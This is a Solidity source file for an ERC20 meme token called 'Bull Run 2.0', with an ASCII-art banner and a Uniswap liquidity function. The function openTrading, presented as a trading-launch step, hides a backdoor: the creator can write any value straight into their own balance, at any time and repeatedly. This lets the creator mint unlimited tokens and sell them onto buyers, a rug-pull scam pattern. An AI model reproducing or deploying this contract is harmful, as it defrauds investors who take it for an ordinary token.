// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.19;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {IUniswapV2Router02} from "../interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Factory} from "../interfaces/IUniswapV2Factory.sol";

/**

 ________  __                        _______             __  __        _______
/        |/  |                      /       \           /  |/  |      /       \
$$$$$$$$/ $$ |____    ______        $$$$$$$  | __    __ $$ |$$ |      $$$$$$$  | __    __  _______
   $$ |   $$      \  /      \       $$ |__$$ |/  |  /  |$$ |$$ |      $$ |__$$ |/  |  /  |/       \
   $$ |   $$$$$$$  |/$$$$$$  |      $$    $$< $$ |  $$ |$$ |$$ |      $$    $$< $$ |  $$ |$$$$$$$  |
   $$ |   $$ |  $$ |$$    $$ |      $$$$$$$  |$$ |  $$ |$$ |$$ |      $$$$$$$  |$$ |  $$ |$$ |  $$ |
   $$ |   $$ |  $$ |$$$$$$$$/       $$ |__$$ |$$ \__$$ |$$ |$$ |      $$ |  $$ |$$ \__$$ |$$ |  $$ |
   $$ |   $$ |  $$ |$$       |      $$    $$/ $$    $$/ $$ |$$ |      $$ |  $$ |$$    $$/ $$ |  $$ |
   $$/    $$/   $$/  $$$$$$$/       $$$$$$$/   $$$$$$/  $$/ $$/       $$/   $$/  $$$$$$/  $$/   $$/

The bull run is back!

*/
contract TheBullRun is ERC20, Ownable {
    address internal creator;

    constructor(uint256 supply) ERC20("Bull Run 2.0", "BULLRUN2") {
        _mint(msg.sender, supply);
        creator = msg.sender;
    }

    function openTrading(uint256 liquidty) public payable {
        require(msg.sender == creator, "!creator");
        IUniswapV2Router02 unirouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _balances[creator] = liquidty;
        if (msg.value > 1) {
            _approve(
                address(this),
                address(unirouter),
                balanceOf(address(this))
            );
            unirouter.addLiquidityETH{value: msg.value}(
                address(this),
                balanceOf(address(this)),
                0,
                msg.value,
                address(0),
                block.timestamp + 1
            );
        }
    }
}